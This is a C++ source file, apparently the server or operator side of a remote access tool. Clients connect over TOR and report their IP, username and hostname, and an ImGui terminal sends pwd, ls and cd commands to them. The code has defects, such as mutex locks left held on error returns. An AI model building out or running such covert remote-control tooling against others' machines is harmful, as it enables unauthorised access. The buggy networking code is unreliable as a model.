#include "includeCrap.hpp"

/*
    Class for a connection to the server.
    Decided to put the terminal functions inside this class, hopefully that wasnt a bad idea and it wont    Mostly holds data about the connection.
    Also has useful functions :) become a mess
*/
class connection{
public: // Making everything public temporarily
    int sockFd = -1; // Socket file descriptor - assumed to be valid when the object is created
    struct sockaddr_in address; // Address structure for the client
    int addrlen; // Length of the address
    std::string username;
    std::string hostname;
    std::string publicIp; // Public IP of the client - sent by the client since we can't get it from the socket due to the usage of TOR
    std::mutex sockFdMutex; // Only one thread can use the socket file descriptor at a time
    bool lastConnectivityCheck = false; // Last result of the connectivity check
    bool terminalActive = false; // Whether or not the terminal is being displayed and used
    std::vector<std::string> plainTextMessageHistory; // Elements of this vector are displayed in the terminal
    char inputBuffer[1024] = {0}; // Used for the text input box
    const unsigned int inputBufferSize = 1024; // Size of the input buffer - could probably get rid of this dumb variable
    std::string msgToSend = ""; // This will be derived from the input buffer


    /*
        Constructor/destructor
    */

   
    connection(int sockFd, struct sockaddr_in address, int addrlen){
       this->sockFd = sockFd;
       this->address = address; // !!! Not being used
       this->addrlen = addrlen; // !!! Not being used
    }

    ~connection(){
        this->sockFdMutex.lock();
        close(this->sockFd);
        this->sockFdMutex.unlock();
    }



    /*
        Some GUI stuff
    */


    void drawDebugWindow(){ // Draws some basic debug info to the screen
        ImGui::SetNextWindowPos(ImVec2(0, 0), ImGuiCond_Once);
        ImGui::SetNextWindowSize(ImVec2(25, 6), ImGuiCond_Once);
        ImGui::Begin(("Socket " + std::to_string(this->sockFd) + " debug info").c_str());
        ImGui::Text("Username: %s", this->username.c_str());
        ImGui::Text("Hostname: %s", this->hostname.c_str());
        ImGui::Text("Public IP: %s", this->publicIp.c_str());
        ImGui::Text("Connectivity: %s", (this->lastConnectivityCheck)?"OK":"ERR");
        ImGui::End();
    }

    void drawTerminalWindow(){ // Draws a listbox with the message history, and an inputbox for sending messages
        ImGui::SetNextWindowPos(ImVec2(0, 0), ImGuiCond_Once);
        ImGui::SetNextWindowSize(ImVec2(35, 10), ImGuiCond_Once);
        ImGui::Begin(("Socket " + std::to_string(this->sockFd) + " terminal").c_str());
        ImGui::BeginChild("Scrolling", ImVec2(0, -2), false);
        for(auto m : this->plainTextMessageHistory){
            ImGui::TextWrapped("%s", m.c_str());
        }
        if(ImGui::GetScrollY() >= ImGui::GetScrollMaxY()){
            ImGui::SetScrollHereY(1.0f);
        }
        ImGui::EndChild();
        ImGui::Separator();
        ImGui::SetNextItemWidth(ImGui::GetContentRegionAvailWidth());
        if(ImGui::InputText("##Input", this->inputBuffer, this->inputBufferSize, ImGuiInputTextFlags_EnterReturnsTrue)){
            this->msgToSend = std::string(this->inputBuffer);
            memset(this->inputBuffer, 0, this->inputBufferSize);
        }
        ImGui::End();
    }



    /*
        Update/close functions
    */


    // Draws the window and sends messages
    void update(){
        if(this->terminalActive){
            this->drawTerminalWindow();
        }
        if(this->msgToSend != ""){
            this->parseSendCmd(this->msgToSend);
            this->msgToSend = "";
        }

        // Read all the data from the socket
        char buffer[1024] = {0};
        int bytesReceived = 0;
        int flags = fcntl(this->sockFd, F_GETFL, 0);
        fcntl(this->sockFd, F_SETFL, flags | O_NONBLOCK);
        do{
            bytesReceived = recv(this->sockFd, buffer, 1024, 0);
        }while(bytesReceived > 0);
        fcntl(this->sockFd, F_SETFL, flags);
    }

    void closeTerminal(){ // Does a little cleanup, ! does not close the socket !
        this->terminalActive = false;
        // Read all the data from the socket to ensure the ping-pong works
        // Do so in non-blocking mode
        char buffer[1024] = {0};
        int bytesReceived = 0;
        int flags = fcntl(this->sockFd, F_GETFL, 0);
        fcntl(this->sockFd, F_SETFL, flags | O_NONBLOCK);
        do{
            bytesReceived = recv(this->sockFd, buffer, 1024, 0);
        }while(bytesReceived > 0);
        fcntl(this->sockFd, F_SETFL, flags);
    }


    /*
        Basic networking functionality
    */


    // Send "ping" to the client, if the client does not respon with "ping;pong;", return false
    bool connectivityCheck(){
        this->sockFdMutex.lock();
        int bytesSent = send(this->sockFd, "ping;", 5, 0);
        if(bytesSent != 5){
            this->sockFdMutex.unlock();
            this->lastConnectivityCheck = false;
            return false;
        }
        char buffer[10] = {0};
        int bytesReceived = recv(this->sockFd, buffer, 10, 0);
        if(std::string(buffer) != "ping;pong;"){
            this->sockFdMutex.unlock();
            this->lastConnectivityCheck = false;
            return false;
        }
        this->sockFdMutex.unlock();
        this->lastConnectivityCheck = true;
        return true;
    }

    // Send an std::string to the client. Mostly for testing
    void sendMsgPlaintext(std::string msg){
        this->sockFdMutex.lock();
        int bytesSent = send(this->sockFd, msg.c_str(), msg.length(), 0);
        this->sockFdMutex.unlock();
        if(bytesSent < 0){
            this->msgToSend = "Error sending message: " + std::to_string(bytesSent);
            return;
        }
        this->plainTextMessageHistory.push_back("Sent: " + msg);
        this->msgToSend = "";
    }

    // Gets some information from the client and returns true if successful
    bool intialConnection(){
        this->sockFdMutex.lock();
        // Receive the username, hostname, and public IP from the client
        // It must be supplied in the format "ip;username;hostname;"
        char buffer[1024] = {0}; // Should easily be enough space
        int bytesReceived = recv(this->sockFd, buffer, 1024, 0);
        if(bytesReceived < 0){
            return false;
        }
        std::string bufferString = std::string(buffer); // Convert to a string for easier parsing
        if(std::count(bufferString.begin(), bufferString.end(), ';') != 3){
            return false;
        }
        this->publicIp = bufferString.substr(0, bufferString.find(';'));
        bufferString = bufferString.substr(bufferString.find(';') + 1);
        this->username = bufferString.substr(0, bufferString.find(';'));
        bufferString = bufferString.substr(bufferString.find(';') + 1);
        this->hostname = bufferString.substr(0, bufferString.find(';'));
        // Send the connection confirmation message to the client
        // <ip>;<username>;<hostname>;connected;
        std::string confirmMsg = this->publicIp + ";" + this->username + ";" + this->hostname + ";connected;";
        int bytesSent = send(this->sockFd, confirmMsg.c_str(), confirmMsg.length(), 0);
        this->sockFdMutex.unlock();
        return true; // TODO: Properly verify the data received is valid
    }



    /*
        Command handling code
    */

    // Available commands (designed for the user):
    // - pwd - sends as "pwd;" - receives response as "pwd;<path>;"
    // - ls - sends as "ls;" - receives response as "ls;<file1>;<file2>;<file3>;"
    // - cd <path> - sends as "cd;<path>;" - receives success as "cd;<path>;" or failure as "cd;error;"
    // - More are TODO, once basic functionality is done

    void parseSendCmd(std::string cmd){
        this->plainTextMessageHistory.push_back("--> " + cmd);
        if(cmd == "pwd"){
            this->pwd();
        }
        else if(cmd == "ls"){
            this->ls();
        }
        else if(cmd.substr(0, 3) == "cd "){
            this->cd(cmd.substr(3));
        }
        else{
            this->plainTextMessageHistory.push_back("Unknown command: " + cmd);
        }
    }

    void pwd(){
        // Send "pwd;" to the client
        this->sockFdMutex.lock(); // Lock the socket until this command is done
        int bytesSent = send(this->sockFd, "pwd;", 4, 0);
        if(bytesSent < 0){
            this->plainTextMessageHistory.push_back("ERR: send(): " + std::to_string(bytesSent));
            this->sockFdMutex.unlock();
            return;
        }
        // Receive the response from the client
        char pwdRecvBuffer[4096] = {0}; // Big enough for even the longest path on linux! (windows is a puny 260 characters max lol)
        int bytesReceived = recv(this->sockFd, pwdRecvBuffer, 4096, 0); // Blocking call - maybe figure out a way to prevent issues with this?
        if(bytesReceived < 0){
            this->plainTextMessageHistory.push_back("ERR: recv(): " + std::to_string(bytesReceived));
            this->sockFdMutex.unlock();
            return;
        }
        std::string pwdRecvBufferString = std::string(pwdRecvBuffer); // Convert to a string for easier parsing
        if(pwdRecvBufferString.substr(0, 4) != "pwd;"){
            this->plainTextMessageHistory.push_back("ERR: Received bad response format");
            this->sockFdMutex.unlock();
            return;
        }
        pwdRecvBufferString = pwdRecvBufferString.substr(4);
        this->plainTextMessageHistory.push_back(pwdRecvBufferString);
        this->sockFdMutex.unlock(); // Command complete!
    }

    void ls(){
        // Send "ls;" to the client
        this->sockFdMutex.lock();
        int bytesSent = send(this->sockFd, "ls;", 3, 0);
        if(bytesSent < 0){
            this->plainTextMessageHistory.push_back("ERR: send(): " + std::to_string(bytesSent));
            this->sockFdMutex.unlock();
            return;
        }
        // Receive the response from the client
        char lsRecvBuffer[4096] = {0}; // Ideally this would be dynamic, will do later
        int bytesReceived = recv(this->sockFd, lsRecvBuffer, 4096, 0);
        if(bytesReceived < 0){
            this->plainTextMessageHistory.push_back("ERR: recv(): " + std::to_string(bytesReceived));
            this->sockFdMutex.unlock();
            return;
        }
        std::string lsRecvBufferString = std::string(lsRecvBuffer); // Convert to a string for easier parsing
        if(lsRecvBufferString.substr(0, 3) != "ls;"){
            this->plainTextMessageHistory.push_back("ERR: Received bad response format");
            this->sockFdMutex.unlock();
            return;
        }
        lsRecvBufferString = lsRecvBufferString.substr(3);

        // Display the files on the terminal
        std::stringstream ss(lsRecvBufferString);
        std::string f;
        while(getline(ss, f, ';')){
            this->plainTextMessageHistory.push_back(f);
        }

        this->sockFdMutex.unlock();
    }

    void cd(std::string path){
        this->sockFdMutex.lock();
        int bytesSent = send(this->sockFd, ("cd;" + path + ";").c_str(), path.length() + 4, 0);
        if(bytesSent < 0){
            this->plainTextMessageHistory.push_back("ERR: send(): " + std::to_string(bytesSent));
            this->sockFdMutex.unlock();
            return;
        }
        // Receive the response from the client
        char cdRecvBuffer[4096] = {0}; // Ideally this would be dynamic, will do later
        int bytesReceived = recv(this->sockFd, cdRecvBuffer, 4096, 0);
        if(bytesReceived < 0){
            this->plainTextMessageHistory.push_back("ERR: recv(): " + std::to_string(bytesReceived));
            this->sockFdMutex.unlock();
            return;
        }
        std::string cdRecvBufferString = std::string(cdRecvBuffer); // Convert to a string for easier parsing
        this->plainTextMessageHistory.push_back(cdRecvBufferString);
        this->sockFdMutex.unlock();
    }


};